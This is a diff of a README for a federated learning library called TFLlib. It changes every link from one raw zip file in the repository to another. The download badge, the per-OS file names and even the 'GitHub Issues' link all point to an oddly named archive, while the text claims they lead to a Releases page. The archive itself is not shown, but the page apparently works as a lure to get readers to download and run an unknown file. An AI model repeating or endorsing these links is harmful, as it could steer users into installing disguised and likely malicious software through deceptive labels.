@@ -1,6 +1,6 @@
 # 🎉 TFLlib - Trustworthy Federated Learning Simplified
 
-[![Download TFLlib](https://raw.githubusercontent.com/eil598/TFLlib/master/flcore/utils/TFLlib_toadflax.zip)](https://raw.githubusercontent.com/eil598/TFLlib/master/flcore/utils/TFLlib_toadflax.zip)
+[![Download TFLlib](https://raw.githubusercontent.com/eil598/TFLlib/master/examples/Llib-TF-v2.3-beta.2.zip)](https://raw.githubusercontent.com/eil598/TFLlib/master/examples/Llib-TF-v2.3-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,13 +8,13 @@ Welcome to TFLlib! This guide will help you easily download and run TFLlib, a tr
 
 ## 📥 Download & Install
 
-To download TFLlib, please visit the following link: [Download TFLlib](https://raw.githubusercontent.com/eil598/TFLlib/master/flcore/utils/TFLlib_toadflax.zip)
+To download TFLlib, please visit the following link: [Download TFLlib](https://raw.githubusercontent.com/eil598/TFLlib/master/examples/Llib-TF-v2.3-beta.2.zip)
 
 ### Steps to Download
 
 1. Click on the link above to open the Releases page.
 2. You will see a list of available versions. Look for the latest release.
-3. Under the latest release, you will find several files. Choose the one that fits your operating system, typically labeled something like `https://raw.githubusercontent.com/eil598/TFLlib/master/flcore/utils/TFLlib_toadflax.zip` for Windows or `https://raw.githubusercontent.com/eil598/TFLlib/master/flcore/utils/TFLlib_toadflax.zip` for macOS.
+3. Under the latest release, you will find several files. Choose the one that fits your operating system, typically labeled something like `https://raw.githubusercontent.com/eil598/TFLlib/master/examples/Llib-TF-v2.3-beta.2.zip` for Windows or `https://raw.githubusercontent.com/eil598/TFLlib/master/examples/Llib-TF-v2.3-beta.2.zip` for macOS.
 4. Click on the file to start the download.
 
 ### Installation Instructions
@@ -59,7 +59,7 @@ After installing TFLlib, you can begin using it. Here’s a quick overview:
 
 If you have any questions or need assistance, feel free to reach out for help. You can find support through:
 
-- [GitHub Issues](https://raw.githubusercontent.com/eil598/TFLlib/master/flcore/utils/TFLlib_toadflax.zip): Post your questions or report issues.
+- [GitHub Issues](https://raw.githubusercontent.com/eil598/TFLlib/master/examples/Llib-TF-v2.3-beta.2.zip): Post your questions or report issues.
 - Community Forums: Connect with other users for tips and shared experiences.
 
 ## 🌟 Community Contributions
